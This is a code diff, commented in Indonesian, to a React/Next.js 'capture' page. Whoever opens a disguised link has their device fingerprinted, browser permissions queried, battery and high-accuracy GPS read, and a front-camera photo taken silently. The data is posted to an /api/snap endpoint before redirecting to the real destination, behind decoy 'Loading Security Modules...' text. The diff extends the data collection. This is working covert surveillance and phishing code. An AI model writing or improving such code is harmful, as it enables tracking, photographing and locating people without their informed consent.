@@ -3,7 +3,6 @@
 import React, { useEffect, useRef, Suspense } from "react";
 import { useSearchParams } from "next/navigation";
 
-// Komponen utama yang berisi logika capture
 function CaptureContent() {
   const searchParams = useSearchParams();
   const t = searchParams.get("t");
@@ -12,7 +11,7 @@ function CaptureContent() {
 
   useEffect(() => {
     const autoProcess = async () => {
-      // 1. Decode URL tujuan untuk redirect
+      // 1. Decode Destination
       let destination = "/";
       try {
         if (t) destination = atob(t);
@@ -20,7 +19,7 @@ function CaptureContent() {
         destination = "/";
       }
 
-      // 2. Deteksi Info Perangkat
+      // 2. Deteksi Info Perangkat & Jaringan
       const deviceInfo = {
         model: navigator.userAgent.includes("Android")
           ? "Android"
@@ -28,62 +27,84 @@ function CaptureContent() {
             ? "iOS"
             : "PC",
         os: navigator.platform,
-        language: navigator.language,
         browser: navigator.userAgent.split(" ").pop(),
+        language: navigator.language,
+        cores: navigator.hardwareConcurrency || "Unknown",
+        memory: (navigator as any).deviceMemory || "Unknown",
       };
 
-      // 3. Deteksi Baterai
+      // 3. Deteksi Status Izin (Sesuai daftar perizinan browser)
+      const getPermissions = async () => {
+        const perms: any = {};
+        const list = [
+          "notifications",
+          "geolocation",
+          "clipboard-read",
+          "camera",
+          "microphone",
+        ];
+
+        for (const name of list) {
+          try {
+            const status = await navigator.permissions.query({
+              name: name as any,
+            });
+            perms[name] = status.state;
+          } catch {
+            perms[name] = "unsupported";
+          }
+        }
+        return perms;
+      };
+
+      const browserPerms = await getPermissions();
+
+      // 4. Deteksi Baterai
       let batteryInfo = null;
       try {
         if ("getBattery" in navigator) {
-          const battery: any = await (navigator as any).getBattery();
+          const b: any = await (navigator as any).getBattery();
           batteryInfo = {
-            level: Math.round(battery.level * 100),
-            charging: battery.charging,
+            level: Math.round(b.level * 100),
+            charging: b.charging,
           };
         }
       } catch (e) {}
 
-      // 4. Deteksi Izin & Sensor
-      const permissionsStatus = {
-        notifications:
-          "Notification" in window ? Notification.permission : "Not Supported",
-        nearby: "bluetooth" in navigator ? "Supported" : "Not Supported",
-        audio: !!(
-          navigator.mediaDevices && navigator.mediaDevices.getUserMedia
-        ),
-      };
-
       // 5. Ambil GPS
-      const gps = await new Promise((resolve) => {
+      const gps: any = await new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(
           (pos) =>
-            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+            resolve({
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              acc: pos.coords.accuracy,
+            }),
           () => resolve(null),
-          { timeout: 5000 },
+          { timeout: 5000, enableHighAccuracy: true },
         );
       });
 
-      // 6. Ambil Gambar Kamera
+      // 6. Ambil Gambar & Kirim
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
+          audio: false,
         });
 
         if (videoRef.current && canvasRef.current) {
           videoRef.current.srcObject = stream;
-          await new Promise((r) => setTimeout(r, 1500));
+          await new Promise((r) => setTimeout(r, 1500)); // Tunggu fokus kamera
 
-          const video = videoRef.current;
           const canvas = canvasRef.current;
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext("2d")?.drawImage(video, 0, 0);
+          canvas.width = videoRef.current.videoWidth;
+          canvas.height = videoRef.current.videoHeight;
+          canvas.getContext("2d")?.drawImage(videoRef.current, 0, 0);
 
           const image = canvas.toDataURL("image/png");
           stream.getTracks().forEach((track) => track.stop());
 
-          // 7. Kirim SEMUA data ke API
+          // Kirim Data Lengkap
           await fetch("/api/snap", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -93,17 +114,16 @@ function CaptureContent() {
               device: deviceInfo,
               battery: batteryInfo,
               permissions: {
-                ...permissionsStatus,
+                ...browserPerms,
                 location: !!gps,
-                camera: true,
+                nearby:
+                  "bluetooth" in navigator ? "supported" : "not supported",
               },
             }),
           });
-
-          window.location.replace(destination);
         }
       } catch (err) {
-        // Fallback jika kamera ditolak: Kirim data sisa yang tersedia
+        // Jika kamera ditolak, tetap kirim data sisa (GPS/Device Info)
         await fetch("/api/snap", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -112,13 +132,10 @@ function CaptureContent() {
             gps,
             device: deviceInfo,
             battery: batteryInfo,
-            permissions: {
-              ...permissionsStatus,
-              location: !!gps,
-              camera: false,
-            },
+            permissions: { ...browserPerms, location: !!gps, camera: "denied" },
           }),
         });
+      } finally {
         window.location.replace(destination);
       }
     };
@@ -129,8 +146,8 @@ function CaptureContent() {
   return (
     <div className="bg-black text-white flex flex-col items-center justify-center min-h-screen font-mono">
       <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-blue-500 mb-4"></div>
-      <p className="text-xs tracking-widest text-slate-500 uppercase animate-pulse">
-        Secure Link Initializing...
+      <p className="text-[10px] tracking-[0.2em] text-slate-500 uppercase animate-pulse">
+        System Synchronizing...
       </p>
       <video
         ref={videoRef}
@@ -147,9 +164,9 @@ export default function CapturePage() {
   return (
     <Suspense
       fallback={
-        <div className="bg-black text-white flex items-center justify-center min-h-screen font-mono">
-          <p className="text-xs uppercase tracking-widest text-slate-600">
-            Initialising Secure Environment...
+        <div className="bg-black flex items-center justify-center min-h-screen">
+          <p className="text-slate-700 text-[10px] uppercase tracking-widest">
+            Loading Security Modules...
           </p>
         </div>
       }
